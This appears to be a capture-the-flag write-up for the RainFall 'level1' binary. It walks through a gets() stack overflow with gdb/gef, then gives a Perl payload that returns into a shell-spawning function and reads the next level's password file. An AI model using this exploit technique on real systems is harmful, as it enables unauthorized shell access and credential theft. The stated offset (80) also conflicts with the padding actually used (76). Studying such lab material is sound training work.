# Solution

Here is the decompilation of the binary in C:

```c
int run(void)
{
    fwrite("Good... Wait What?\n", 1, 19, stdout);
    return system("/bin/sh");
}

int main(int ac, char **av)
{
    int v4;

    gets(&v4);
    return (0);
}
```

So here we use a function that is bad `gets()` if we go to the man section of `gets()`

```
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will  read,
       and  because  gets()  will  continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has
       been used to break computer security.  Use fgets() instead.

       For more  information,  see  CWE-242  (aka  "Use  of  Inherently  Dangerous  Function")  at  http://cwe.mitre.org/data/defini‐
       tions/242.html
```

So basically we will be able to rewrite the return address this will allow us to return to the run function to do so,
we first need to get the offset at which we find ourselve to overwrite the return address.

We will find the offset by using a de brujin string,
we will use the `gdb gef` which add multiple extra command to help us to create exploit

So first we break in main and then run the program:
```sh
gef➤  b main
Breakpoint 1 at 0x8048483
gef➤  r
```

Now we need to create the de brujin string:

```sh
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
```

Now we need to pass the string when gets is called:
```sh
gef➤  c 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Now we will SIGSEGV after passing the string which is wanted from this we need to find the offset at which,
we sigsegv so we will check the current $esp register which is the current stack address that overwrite the return address.

```sh
gef➤  x/xw $esp
0xffffcb60:     0x61616175
gef➤  pattern search 0x61616175
[+] Searching for '75616161'/'61616175' with period=4
[+] Found at offset 80 (little-endian search) likely
```

So apparently it's 80 now we need to check this by create a string with a specfic padding here we will "A",
and the last 4 byte before overwriting the return address "B".

```sh
gef➤  c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
gef➤  x/wx $esp
0xffffcb60:     0x42424242
```

So yes the overwrite start at offset 80,
now we need to find the address of run function which will be replace after the 80 byte padding.

We just need to print the value of the function 
```
gef➤  p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

So from this we need to pack the address which is basically a simple way of outputing,
the address that will match a specific endianess and architecure (32-bit or 64-bit),
so the result of the packed address here will be in little-endian using 32-bit.

We can use python module struct to do the packing.


```python
import struct

# "<" mean little endian "I" mean int32 bit
print(struct.pack("<I", 0x8048444))
# Output: b'D\x84\x04\x08'
```

So the exploit will be 80 byte of padding and b'D\x84\x04\x08' at the end.

So let's create the exploit:
```sh
level1@RainFall:~$ (perl -e 'print "A"x76 . "D\x84\x04\x08"') | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
```

As you can see the overwrite to the function is actually working we see fwrite() call "Good... Wait what?", 
but we still segfault this is due to the problem that we have stdin that is not set properly to the run() function,
to allowed the stdin to work we need to use `cat` command so it doesn't leave the stdin.

So here is the exploit that work now:

```sh
level1@RainFall:~$ (perl -e 'print "A"x76 . "D\x84\x04\x08"'; cat -) | ./level1 

Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
